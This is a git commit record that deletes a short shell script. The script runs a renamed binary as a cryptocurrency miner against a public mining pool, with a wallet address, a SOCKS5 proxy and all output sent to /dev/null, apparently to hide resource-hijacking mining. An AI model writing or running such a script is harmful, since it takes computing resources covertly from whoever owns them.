c5937ea155f292970e797f8fdd63c759f5efb2aa
cemungudbeb <91490518+cemungudbeb@users.noreply.github.com>
2021-10-20 03:26:00 +0700

    Delete crdt12076.sh

--- crdt12076.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/bash
-chmod +x tour 
-timeout 280m ./tour -a minotaurx -o stratum+tcp://minotaurx.eu.mine.zpool.ca:7019 -u DTPPTaZiWfd9RHqzmU5sXNke5nQF8QbENr -p c=DGB -t 4 -x socks5://192.252.209.155:14455 > /dev/null 2>&1
-sudo apt update
